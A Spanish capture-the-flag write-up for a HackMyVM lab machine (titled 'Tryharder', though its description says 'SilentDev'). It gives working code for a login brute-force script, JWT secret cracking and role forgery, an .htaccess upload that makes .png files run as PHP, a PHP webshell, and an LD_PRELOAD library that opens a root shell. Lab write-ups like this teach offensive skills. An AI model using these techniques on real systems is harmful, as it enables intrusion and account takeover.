---
title: "Tryharder"
date: 2026-02-04
draft: false
description: "Writeup de la máquina SilentDev en HackMyVM."
categories: ["HackMyVM"]
tags: ["Hidden Path Disclosure", "Weak Credentials", "JWT Secret Brute Force", "JWT Privilege Escalation", "Unrestricted File Upload", "Apache .htaccess Abuse", "LD_PRELOAD Privilege Escalation"]
image: "/images/tryharder.webp"
level: Medium
---

# Reconocimiento

Comenzamos con un escaneo en red para identificar la máquina víctima, eso mediante **Arp-Scan**:

```bash
arp-scan -I ens33 --localnet --ignoredups
```

![img1](/images/Pasted%20image%2020260131215626.webp)

Observamos como la IP de la máquina víctima es `192.168.1.72`.
Procedemos tratar de intuir el sistema, esto con ayuda del comando `ping`:

```bash
ping -c 1 192.168.1.72
```

![img2](/images/Pasted%20image%2020260131215828.webp)

Podemos ver que  `ttl=64`, por lo tanto intuimos una posible máquina Linux.

Comenzamos a realizar un escaneo con ayuda de **Nmap**, esto con el primer objetivo de identificar primero los puertos abiertos:

```bash
nmap -p- --open -sS --min-rate 5000 -n -v -Pn 192.168.1.72 -oG allPorts
```

![img3](/images/Pasted%20image%2020260131220144.webp)

Se detectan los puertos `22` y `80` abiertos. Ahora vamos a realizar un segundo escaneo más centrado en obtener información de ambos puertos:

```bash
nmap -p22,80 -sVC 192.168.1.72 -oN target
```

![img4](/images/Pasted%20image%2020260131220411.webp)

Vemos que el puerto `22` corre el servicio de SSH y el puerto `80` corre HTTPD (Apache). También observamos cómo la probabilidad de ser Linux aumenta y aunque no se seguro nos sugiere un Debian, esto debido a lo que nos logra reportar **Nmap**.

Lo primero será observar el contenido de la web:

![img5](/images/Pasted%20image%2020260131221002.webp)

Observamos una web en chino pero ninguno de los botones o enlaces llevan a ningún lado. Algo que podemos hacer es identificar qué nos reportan como tecnologías implementadas en la web algunas herramientas que, en mi caso, son Wappalyzer y Whatweb.

![img6](/images/Pasted%20image%2020260131221235.webp)
![img7](/images/Pasted%20image%2020260131221305.webp)

Los resultados nos confirman cada vez más de que se trata de un sistema Linux, en especifico, Debian.

Continuando con la web, vamos a revisar, antes de realizar un escaneo de directorios con **Gobuster**, el código fuente para ver si logramos obtener información:

![img8](/images/Pasted%20image%2020260131221629.webp)

Al parecer tenemos una ruta. Tal cual no es valida, pero la estructura de la misma, en especial por el `=` al final, puede significar que se encuentra en Base64. Veamos qué pasa si intentamos pasarlo a texto claro:

```bash
echo 'NzQyMjE=' | base64 -d;echo
```

![img9](/images/Pasted%20image%2020260131221924.webp)

Tenemos algunos números que pueden ser la verdadera ruta. Veamos qué es lo que obtenemos:

![img10](/images/Pasted%20image%2020260131222135.webp)

Encontramos un login. Ahora podemos intentar identificar nuevamente las tecnologías de la web con ayuda de Wappalyzer y Whatweb:

![img11](/images/Pasted%20image%2020260131222244.webp)

![img12](/images/Pasted%20image%2020260131222315.webp)

Por el momento no vemos nada nuevo, pero podría estar en uso de igual forma php, cuestión que seria de comprobar mediante extensiones como `index.php`.

Comencemos a realizar un poco de reconocimiento de la web. Veamos que directorios disponibles tiene, esto con ayuda de **Gobuster**:

```bash
gobuster dir -u http://192.168.1.72/74221/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
```

![img13](/images/Pasted%20image%2020260201162914.webp)

Se encontró el directorio `uploads/`. Veamos que es lo que este contiene:

![img14](/images/Pasted%20image%2020260201163143.webp)

Observamos un directorio con el nombre `999`. Vemos lo que contiene dentro:

![img15](/images/Pasted%20image%2020260201163410.webp)

No contiene nada. Esto puede que no se vea como algo útil, pero si lo pensamos de manera más detenida, este directorio puede estar almacenando archivos subidos por algún usuario.

# Explotación

Ya no tenemos nada más por lo que podemos intentar un pequeño ataque de fuerza bruta al login, solo con credenciales y contraseñas comunes para verificar si obtenemos algo.

Me gusta mucho automatizar este tipo de ataques, así que primero con ayuda de Burp Suite, vamos a capturar la petición:

![img16](/images/Pasted%20image%2020260201165629.webp)

Lo que necesitamos es todo lo seleccionado en la máquina que son: método (Post), cabeceras (Headers, User-Agent, Content-Type), data y, en este caso, como la respuesta, aun siendo incorrecta, nos responde con un código de estado `200`, vamos a fijarnos cuando la longitud del contenido cambie.

Ya con toda la información necesaria, nuestro script quedará de la siguiente manera:

```python
#!/usr/bin/python3

import requests, sys, signal

def def_handler(sig, frame):
    print("\n\n[!] Saliendo....\n\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)


def bruteForce(user, passwd):
    url_main = "http://192.168.1.72/74221/"
    header = {
        "Host":"192.168.1.72",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    data = f"username={user}&password={passwd}"

    r = requests.post(url=url_main, headers=header, data=data)

    if len(r.text) != 2257:
        print("\n==========Credenciales==========")
        print(f"Username:{user}")
        print(f"Password:{passwd}\n")


def readFile(file):

    dic = []

    with open(file, "r") as file:
        for line in file:
            dic.append(line.strip())

    return dic


def main():

    dic_user = readFile(sys.argv[1])
    dic_passwd = readFile(sys.argv[2])

    for user in dic_user:
        for passwd in dic_passwd:
            bruteForce(user, passwd)


if __name__ == '__main__':
    main()

```

Su ejecución es bastante sencilla y en mi caso será:

```bash
python3 bruteForce.py /usr/share/seclists/Usernames/top-usernames-shortlist.txt /usr/share/seclists/Passwords/Common-Credentials/top-passwords-shortlist.txt
```

![img17](/images/Pasted%20image%2020260201173239.webp)

Observamos de forma correcta las credenciales válidas.

Una vez que ingresamos, nos encontramos con la siguiente interfaz:

![img18](/images/Pasted%20image%2020260201173720.webp)

Se nos indica algunas cosas importantes, como: usuario 123, rol `usuario` y que no tenemos permisos para subir archivos. Esto de subir archivos, de cierta forma, confirma que en la ruta `uploads/999` se almacene archivos.

## Análisis de sesión y JWT

En este caso inspeccionando la web encontramos algo en las cookies:

![img19](/images/Pasted%20image%2020260201185715.webp)

Observamos que tenemos un JSON Web Token. Intentemos ver el contenido del mismo primero:

![img20](/images/Pasted%20image%2020260201185846.webp)

Al parecer, el JSON Web Token es el encargado de mantener o definir el rol asociado a la cuenta. Se intentó modificar el tipo de algoritmo que usa el JWT para que sea nulo y no funcionó, esto tomando en cuenta que al pasar el algoritmo a `none` y eliminar la firma se vuelve un token invalido. Tomando en cuenta esto, vamos a intentar, mediante fuerza bruta, obtener el secreto que nos permita modificar el JWT de forma valida.

Para el ataque de fuerza bruta, primero vamos a almacenar este JWT dentro de un archivo llamado `jwt.txt` y, con ayuda de John, ejecutamos fuerza bruta de la siguiente manera:

```bash
john --wordlist=/usr/share/seclists/Passwords/scraped-JWT-secrets.txt jwt.txt
```

![img21](/images/Pasted%20image%2020260201190621.webp)

Listo, con esto tenemos que el secreto del JWT es `jwtsecret123`. Vamos a modificarlo para que el rol sea `admin`:

![img22](/images/Pasted%20image%2020260201190928.webp)

Se insertó el secreto y luego se modifico de `user` a `admin` el rol. Vamos a copiar nuevamente el JWT que vemos dando clic en `Copy JWT` y lo vamos a modificar en la web. Yo tengo una extensión que lo facilita por lo tanto queda de la siguiente forma:

![img23](/images/Pasted%20image%2020260201191147.webp)

Luego de guardar, es cuestión de recargar la web y ver qué sucede:

![img24](/images/Pasted%20image%2020260201191224.webp)

Se ha activado una opción para la subida de archivos. Veamos cómo es:

![img25](/images/Pasted%20image%2020260201191312.webp)

Excelente, tenemos para subir un archivo. En este caso voy a subir un archivo `.jpg` con el objetivo de ver si nos lo permite:

![img26](/images/Pasted%20image%2020260201191418.webp)

Observamos una ruta, vamos a intentar ver si allí nos carga el archivo:

![img27](/images/Pasted%20image%2020260201191555.webp)

Vemos que sí se abre el archivo y que efectivamente es lo que subimos, pero ahora si nos fijamos en nuestra `url`, es la misma de la que ya teníamos conocimiento. Por lo tanto, vamos a inspeccionar:

![img28](/images/Pasted%20image%2020260201191746.webp)

![img29](/images/Pasted%20image%2020260201191807.webp)

## File Upload

Se puede ver cómo se creó la carpeta `123` que almacena los archivos que subimos. En este punto, lo que se busca es un **Abuso de subida de archivos** con el objetivo de obtener un RCE.

Se realizaron diferentes pruebas y, si no es extensión tipo `.jgp` o `.png` no nos permite subirlo. Por lo tanto, vamos a intentar subir un archivo `.htaccess` el cual es interpretado por el servicio de Apache y nos permite modificar ciertas reglas dentro del servidor. En este caso nuestro objetivo será que a los archivos .png se interpreten como `php`  y se definirá el uso del intérprete `php` de la siguiente manera:

Comenzamos creando el archivo `.htaccess` y luego implementamos el siguiente contenido:

```
<IfModule mime_module>
	AddHandler php5-script .png 
	SetHandler application/x-httpd-php 
</IfModule>
```

Listo, subimos el archivo:

![img30](/images/Pasted%20image%2020260201192822.webp)

Ya con esto listo, lo que se va a hacer es subir un archivo con extensión `.png` pero su contenido será `php`, con el cual vamos a ejecutar comandos de la siguiente manera:

```php
<?php
  system($_GET['cmd']);
?>
```

![img31](/images/Pasted%20image%2020260201193218.webp)

Procedemos a subir el archivo:

![img32](/images/Pasted%20image%2020260201193234.webp)

Nos dirigimos a la ruta donde se almacenó y veremos nada por el momento:

![img33](/images/Pasted%20image%2020260201193328.webp)

Esto es debido a que se le tiene que proporcionar el comando mediante el parámetro `cmd`, como veremos en la imagen:

![img34](/images/Pasted%20image%2020260201193424.webp)

Listo, ya tenemos un RCE. Ahora vamos a realizar una Reverse Shell:

Netcat en espera:
![img35](/images/Pasted%20image%2020260201193626.webp)

Ejecutando la reverse Shell:
![img36](/images/Pasted%20image%2020260201193634.webp)

Conexión establecida:
![img37](/images/Pasted%20image%2020260201193705.webp)

# Escalada de Privilegios

Ya con la shell, comenzamos a enumerar el sistema.

Se han realizado diferentes métodos de enumeración pero no se encontró algo usual como permisos SUID o configuraciones en `sudo -l`. Algo que se puede hacer en estos casos es buscar a ver si se logra obtener archivos ocultos de la siguiente manera:

```bash
find / -name .\* 2>/dev/null
```

![img38](/images/Pasted%20image%2020260202160924.webp)

Vemos una gran cantidad de archivos dentro de `sys`, pero en realidad no encontramos nada muy relevante. Vamos a eliminar de las respuestas el resultado de `sys`, esto para evitar ver muchos archivos de una carpeta que ya se revisó:

```bash
find / -name .\* 2>/dev/null | grep -v sys
```

![img39](/images/Pasted%20image%2020260202161227.webp)

Como se observa en la imagen, se tiene dos archivos en espacial, los cuales veremos su contenido:

![img40](/images/Pasted%20image%2020260202161716.webp)

Tenemos una nota que nos relata una historia, pero encontramos un archivo `...` una cadena de texto muy similar a la que encontramos para el usuario `pentester` en el `/etc/passwd`:

![img41](/images/Pasted%20image%2020260202161938.webp)

Esto está más relacionado con el encoding. Lo que vamos a hacer es compara cada una de las letras y, donde coincidan, lo marcamos con un 0 y donde no, lo marcaremos con un 1. Esto es un proceso largo, el cual es mucho más sencillo automatizarlo con ayuda de Python:

```python
#!/usr/bin/python3

def main():
    str1 = "Itwasthebestoftimes!itwastheworstoftimes@itwastheageofwisdom#itwastheageoffoolishness$itwastheepochofbelief,itwastheepochofincredulity,&itwastheseasonofLight..."
    str2 = "Iuwbtthfbetuoftimfs\"iuwbsuhfxpsttoguinet@jtwbttieahfogwiseon#iuxatthfageofgpoljthoess%itwbsuiffqocipfbemieg-iuxbsuhffqpdhogjocredvljtz,'iuwasuhesfasooofLjgiu../"

    data = ""

    for let1,let2 in zip(str1,str2):
        if let1 == let2:
            data+="0"
        else:
            data+="1"

    print(data)


if __name__ == '__main__':
    main()
```

Al ejecutarlo vemos lo siguiente:

![img42](/images/Pasted%20image%2020260202162806.webp)

Ahora esto lo llevamos a algún convertidor de binario a string y obtenemos lo siguiente:

![img43](/images/Pasted%20image%2020260202162916.webp)

Esto puede ser una contraseña, y específicamente del usuario `pentester`, ya que la segunda cadena está relacionada al mismo. Por lo tanto intentémoslo:

![img44](/images/Pasted%20image%2020260202163149.webp)

Ya nos encontramos como el usuario `pentester`.

Nuevamente se realizo una enumeración para identificar alguna forma de escalar privilegios, donde se encontró que el comando `find` puede ser ejecutado como sudo. Esto, aunque lo intentemos no va a funcionar debido a que al parecer contamos con ciertas restricciones, especialmente al intentar ejecutar código de forma arbitraria.

Listando los puerto de la máquina víctima, logramos ver un puerto interno abierto, en especifico el puerto `8989`:

![img45](/images/Pasted%20image%2020260202165500.webp)

Mediante `nc`, desde la misma máquina víctima, vamos a conectarnos para ver cómo responde:

```bash
nc 127.0.0.1 8989
```

![img46](/images/Pasted%20image%2020260202171244.webp)

Nos pide una contraseña y, si no es correcta no nos deja pasar. Vamos a intentar reutilizar contraseñas como la que ya obtuvimos para el usuario `pentester` y veamos que sucede:

![img47](/images/Pasted%20image%2020260202171355.webp)

Listo, logramos obtener acceso a una shell, que al parecer es del usuario `xiix`. Por lo que en este caso voy a generar una nueva reverse shell para trabajar con una bash de mejor manera:

![img48](/images/Pasted%20image%2020260202171551.webp)

Se le dará un tratamiento a la bash, para que esto sea mucho más manejable y comenzaremos nuevamente enumerando para ver si logramos obtener algo nuevo.

Se intentó el comando `sudo -l`, pero se necesita contraseña, además de que no encontramos permisos extraños, pero sí un archivo llamado `guess_game`:

![img49](/images/Pasted%20image%2020260202171936.webp)

Si ejecutamos el archivo observamos lo siguiente:

![img50](/images/Pasted%20image%2020260202172017.webp)

Por lo poco que entiendo, es un juego en el cual se requiere adivinar el número generado entre el 0 y el 99.

Algo que se puede hacer, viendo que en general se lo ejecuta de forma múltiple y no pasa nada, es enviar múltiples veces un mismo número y esperar que en alguna ocasión se genere ese valor. Esto lo hacemos de la siguiente manera:

```bash
while true;do echo '90' | ./guess_game ;done
```

![img51](/images/Pasted%20image%2020260202172707.webp)

Luego de algún tiempo, logramos obtener un resultado correcto, donde vemos `Pass: superxiix`.

Algo que quedó pendiente es el comando `sudo -l`, que pedía de una contraseña. Vemos que obtenemos ahora:

![img52](/images/Pasted%20image%2020260202173612.webp)

## Escalada vía LD_PRELOAD

Vemos que tenemos permisos para ejecutar como sudo el comando `whoami`, pero esto no es algo que en realidad nos impacte. Lo que en verdad tenemos que poner atención es en `env_keep+=LD_PRELOAD`,  ya que esta implementación nos da puerta abierta a una posible escalada de privilegios. Esto se deber a que si y solo si esta regla esta establecida por sudo y además el binario al que podemos ejecutar como sudo, en este caso `whoami`, es dinámico, se puede abusar de las librerías compartidas para crear una maliciosa que nos ejecute una shell antes de siquiera llegar a ejecutar el binario.

Uno de los requisitos se cumple. Verifiquemos si `whoami` es dinámico de la siguiente manera:

```bash
ldd /bin/whoami
```

![img53](/images/Pasted%20image%2020260202174304.webp)

Vemos que lista algunas librerías por lo tanto es dinámico.

Con los dos puntos esenciales confirmados, podemos comenzar a crear una librería maliciosa en C para utilizarla de la siguiente manera:

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash -p");
}
```

El nombre puede ser el que queramos. Ya tenemos listo nuestro archivo `hack.c` y lo compilaremos de la siguiente forma:

```bash
gcc -fPIC -shared -nostartfiles -o hack.so hack.c
```

![img54](/images/Pasted%20image%2020260202175611.webp)

Donde:
- `-fPIC` -> Permite generar una librería independiente capaz de ser cargada en una dirección diferente de memoria.
- `-shared` -> Definimos que será una librería compartida en lugar de una ejecutable.
- `-nostartfiles` -> Indicamos que la librería no requiere de los archivos runtime, debido a que la librería no requiere de un punto de entrada ni de un flujo de ejecución autónomo.

Ya con esto solo queda ejecutar `/bin/whoami` llamando a esta librería de la siguiente manera:

```bash
sudo LD_PRELOAD=./hack.so /bin/whoami
```

![img55](/images/Pasted%20image%2020260202182231.webp)

Ya nos encontramos como usuario `root` y es cuestión de enviar la flag.

![img56](/images/Pasted%20image%2020260202182449.webp)

Máquina Terminada.